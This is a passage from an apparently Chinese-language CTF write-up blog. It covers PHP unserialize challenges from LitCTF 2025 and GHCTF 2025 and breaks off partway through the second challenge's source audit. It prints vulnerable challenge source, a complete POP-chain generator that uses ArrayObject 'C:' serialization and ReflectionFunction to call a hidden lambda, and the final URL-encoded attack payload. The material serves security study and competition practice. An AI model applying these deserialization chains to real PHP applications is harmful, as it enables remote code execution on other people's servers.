class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="string">&quot;&quot;</span>, <span class="string">&#x27;die(`/readflag`);&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Taki</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$musubi</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$magic</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;musubi = <span class="variable">$data</span>[<span class="string">&#x27;musubi&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;magic = <span class="variable">$data</span>[<span class="string">&#x27;magic&#x27;</span>];</span><br><span class="line">        <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;musubi)();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>,<span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">        (<span class="keyword">new</span> <span class="variable">$args</span>[<span class="number">0</span>](<span class="variable">$args</span>[<span class="number">1</span>]))-&gt;&#123;<span class="variable language_">$this</span>-&gt;magic&#125;();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mitsuha</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$memory</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$thread</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;memory.<span class="variable language_">$this</span>-&gt;thread;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">KatawareDoki</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$soul</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$kuchikamizake</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;soul)-&gt;<span class="title function_ invoke__">flag</span>(<span class="variable">$this</span>-&gt;kuchikamizake,<span class="variable">$this</span>-&gt;name);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;call error!no flag!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$Litctf2025</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;Litctf2025&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^[Oa]:[\d]+/i&quot;</span>, <span class="variable">$Litctf2025</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$Litctf2025</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;把O改成C不就行了吗,笨蛋!～(∠・ω&lt; )⌒☆&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这边把O改成C可以用下面几个函数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ArrayObject::unserialize</span><br><span class="line">ArrayIterator::unserialize</span><br><span class="line">RecursiveArrayIterator::unserialize</span><br><span class="line">SplObjectStorage::unserialize</span><br></pre></td></tr></table></figure>
<p>就是在最后</p>
<p><code>$b = array(&quot;PusTR&quot;=&gt;$c)</code></p>
<p>（创建一个关联数组，将对象 <code>$c</code> 放入数组中并赋予键名为 <code>&quot;PusTR&quot;</code>。这个数组随后被用来创建一个 <code>ArrayObject</code>对象 $b，并被序列化输出，这里的键名随意，后面对象为前面反序列化对象）</p>
<p><code>$a = new ArrayObject($b);</code></p>
<p>回归源码：</p>
<p>先看开头的：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="string">&quot;&quot;</span>, <span class="string">&#x27;die(`/readflag`);&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>创建了一个匿名函数然后执行/readflag，所以这里我们需要调用这个匿名函数就可以输出flag</p>
<p>而匿名函数名字可以直接输出：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&quot;&quot;</span>,<span class="string">&quot;die(` /readflag`);&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
<p><img src="/img/lazy.gif" data-original="li14.png" alt=""></p>
<p>但是这边注意，每次刷新匿名函数的名字都会变，所以需要打开网站的第一次输入</p>
<p>知道了匿名函数的名字之后，我们还需要知道什么原生类可以调用匿名函数，又往下看：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>,<span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">       (<span class="keyword">new</span> <span class="variable">$args</span>[<span class="number">0</span>](<span class="variable">$args</span>[<span class="number">1</span>]))-&gt;&#123;<span class="variable language_">$this</span>-&gt;magic&#125;();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>这边只有函数名是可控的，就是说需要调用一个无参函数</p>
<p>而<strong>ReflectionFunction</strong>的<strong>invoke</strong>方法可以调用函数，且无参</p>
<p><img src="/img/lazy.gif" data-original="li16.png" alt=""></p>
<p>（借用一下官方WP中的图）</p>
<p>再往下看：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public function __call($func,$args)&#123;</span><br><span class="line">        (new $args[0]($args[1]))-&gt;&#123;$this-&gt;magic&#125;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        ($this-&gt;soul)-&gt;flag($this-&gt;kuchikamizake,$this-&gt;name);</span><br><span class="line">        return &quot;call error!no flag!&quot;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>这里的$func会被赋值为flag，然后$args中就是flag()括号里的值</p>
<p>分析完就很清晰了：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Taki</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$musubi</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$magic</span> = <span class="string">&quot;invoke&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mitsuha</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$memory</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$thread</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">KatawareDoki</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$soul</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$kuchikamizake</span> = <span class="string">&quot;ReflectionFunction&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;\000lambda_1&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Taki</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Mitsuha</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">KatawareDoki</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> -&gt; musubi = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span> -&gt; thread = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$c</span> -&gt; soul = <span class="variable">$a</span>; <span class="comment">//调用不存在的$a-&gt;flag($c-&gt;kuchikamizake, $c-&gt;name)，触发call</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">array</span>(<span class="string">&quot;PusTR&quot;</span>=&gt;<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$e</span> = <span class="keyword">new</span> <span class="built_in">ArrayObject</span>(<span class="variable">$d</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$e</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">#当 $a-&gt;musubi() 被调用时，实际上是在调用 $b，因为 $a-&gt;musubi 被设置为 $b</span></span><br><span class="line"><span class="comment">#$b 是一个 Mitsuha 类的实例，Mitsuha 类有一个 __invoke() 方法，因此 $b 可以像函数一样被调用</span></span><br><span class="line"><span class="comment">#$b-&gt;__invoke() 返回 $b-&gt;memory.$b-&gt;thread</span></span><br><span class="line"><span class="comment">#$b-&gt;thread 是 $c，因此 $b-&gt;__invoke() 返回 $b-&gt;memory.$c</span></span><br><span class="line"><span class="comment">#$c被当作字符串调用(拼接)，触发__toString()</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment">#Litctf2025=C%3A11%3A%22ArrayObject%22%3A245%3A%7Bx%3Ai%3A0%3Ba%3A1%3A%7Bs%3A5%3A%22PusTR%22%3BO%3A4%3A%22Taki%22%3A2%3A%7Bs%3A6%3A%22musubi%22%3BO%3A7%3A%22Mitsuha%22%3A2%3A%7Bs%3A6%3A%22memory%22%3BN%3Bs%3A6%3A%22thread%22%3BO%3A12%3A%22KatawareDoki%22%3A3%3A%7Bs%3A4%3A%22soul%22%3Br%3A4%3Bs%3A13%3A%22kuchikamizake%22%3Bs%3A18%3A%22ReflectionFunction%22%3Bs%3A4%3A%22name%22%3Bs%3A9%3A%22%00lambda_1%22%3B%7D%7Ds%3A5%3A%22magic%22%3Bs%3A6%3A%22invoke%22%3B%7D%7D%3Bm%3Aa%3A0%3A%7B%7D%7D</span></span><br></pre></td></tr></table></figure>
<p><img src="/img/lazy.gif" data-original="li15.png" alt=""></p>
<p>（建议重开环境再传）</p>
<h4 id="GHCTF-2025-Popppppp-NSSCTF"><a href="#GHCTF-2025-Popppppp-NSSCTF" class="headerlink" title="GHCTF 2025]Popppppp | NSSCTF"></a><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/6591">GHCTF 2025]Popppppp | NSSCTF</a></h4><p><a target="_blank" rel="noopener" href="https://hyggevv.github.io/2025/03/07/GHCTF2025/#源码审计">2025GHCTF Official Write Up for Web | hey’s blog</a></p>
<p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CherryBlossom</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fruit1 = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;fruit1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$newFunc</span> = <span class="variable language_">$this</span>-&gt;fruit2;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$newFunc</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Forbidden</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$fruit3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fruit3 = <span class="variable">$string</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$var</span> = <span class="variable language_">$this</span>-&gt;<span class="variable">$name</span>;</span><br><span class="line">        <span class="variable">$var</span>[<span class="variable">$name</span>]();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Warlord</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit4</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit5</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$arg1</span>, <span class="variable">$arg2</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;fruit4;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fruit5-&gt;<span class="title function_ invoke__">ll2</span>(<span class="string">&#x27;b2&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Samurai</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit6</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit7</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$long</span> = @<span class="variable language_">$this</span>-&gt;fruit6-&gt;<span class="title function_ invoke__">add</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$long</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$arg1</span>, <span class="variable">$arg2</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;fruit7-&gt;tt2) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;xxx are the best!!!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mystery</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_walk</span>(<span class="variable">$this</span>, function (<span class="variable">$day1</span>, <span class="variable">$day2</span>) &#123;</span><br><span class="line">            <span class="variable">$day3</span> = <span class="keyword">new</span> <span class="variable">$day2</span>(<span class="variable">$day1</span>);</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$day3</span> <span class="keyword">as</span> <span class="variable">$day4</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> (<span class="variable">$day4</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Princess</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$fruit9</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">addMe</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;The time spent with xxx is my happiest time&quot;</span> . <span class="variable language_">$this</span>-&gt;fruit9;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>([<span class="variable">$this</span>, <span class="variable">$func</span> . <span class="string">&quot;Me&quot;</span>], <span class="variable">$args</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Philosopher</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit10</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit11</span>=<span class="string">&quot;sr22kaDugamdwTPhG5zU&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;fruit11)) == <span class="number">666</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;fruit10-&gt;hey;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UselessTwo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hiddenVar</span> = <span class="string">&quot;123123&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hiddenVar = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;hiddenVar;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Warrior</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit12</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$fruit13</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$name</span> = <span class="variable">$value</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;fruit13 == <span class="string">&quot;xxx&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">strtolower</span>(<span class="variable">$this</span>-&gt;fruit12);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UselessThree</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dummyVar</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UselessFour</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lalala</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hehe&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;GHCTF&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;GHCTF&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>此注意到在Mystery类中存在可以利用原生类的函数(<code>__get()</code>)</p>
<p>此时我们可以考虑利用 php 原生类进行构造恶意代码进行攻击。那么我们就先将其暂定为链尾</p>
<p>而在从不可访问的属性读取数据或者不存在这个键都会调用 <code>__get()</code> 方法</p>
<p>此时我们发现在 Philosopher 这个类中存在访问不存在的键值 key 这个操作，自然就会触发 <code>__get()</code> 函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Philosopher</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit10</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit11</span>=<span class="string">&quot;sr22kaDugamdwTPhG5zU&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;fruit11)) == <span class="number">666</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;fruit10-&gt;hey;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们发现该函数是魔术魔方<code>__invoke()</code>；那么我们就继续想如何才能触发这个<code>__invoke()</code>函数呢？当尝试将对象调用为函数时触发<code>__invoke()</code>。所以此时我们就需要寻找有哪个对象被当作函数进行调用了</p>
<p>我们继续进行源码审计发现在 Warlord 这个类中出现了将对象调用为函数的操作</p>
